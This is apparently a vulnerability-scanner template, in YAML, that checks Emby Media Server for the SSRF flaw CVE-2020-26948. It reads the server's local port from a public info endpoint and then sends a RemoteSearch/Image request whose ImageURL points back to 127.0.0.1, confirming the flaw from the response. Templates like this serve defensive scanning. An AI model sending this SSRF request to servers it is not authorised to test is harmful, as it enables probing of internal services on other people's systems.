name: poc-yaml-emby-mediaserver-cve-2020-26948
binding: 4b60edd5-2804-47ae-8d3c-d01b79f748e8
manual: true
detail:
    author: sharecast
    links:
        - https://github.com/btnz-k/emby_ssrf
    vulnerability:
        id: CT-141929
        level: critical
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /System/Info/Public
            follow_redirects: false
        expression: response.status == 200 && "LocalAddress".bmatches(response.body)
        output:
            search: '''"LocalAddress":.*:(?P<port>[0-9]+)''.bsubmatch(response.body)'
            port: search["port"]
    r1:
        request:
            cache: true
            method: GET
            path: /Items/RemoteSearch/Image?ProviderName=TheMovieDB&ImageURL=http://127.0.0.1:{{port}}
            follow_redirects: false
        expression: response.status == 200 && "touchicon114.png".bmatches(response.body) && "window.dashboardVersion".bmatches(response.body)
expression: r0() && r1()
